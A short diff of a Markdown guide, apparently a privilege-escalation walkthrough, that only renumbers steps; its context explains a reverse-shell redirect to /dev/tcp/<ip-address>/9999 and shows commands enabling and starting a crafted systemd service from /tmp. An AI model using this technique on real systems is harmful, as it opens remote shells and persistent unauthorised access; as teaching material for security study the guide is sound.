@@ -46,11 +46,11 @@ WantedBy=multi-user.target" >> /tmp/test.service
   * **/dev/tcp/<ip-address>/9999**: into special device file that allows to create TCP socket with your IP address under specific port number [(used previously in netcat listener)](#netcat-section)
   * **0>&1**: redirect standard input (0 file descriptor) where the standard input (1 file descriptor) is redirected - which is TCP socket
 
-1. Enable service:
+2. Enable service:
 ```sh
 systemctl enable /tmp/test.service
 ```
-1. Start service:
+3. Start service:
 ```sh
 systemctl start test
 ```
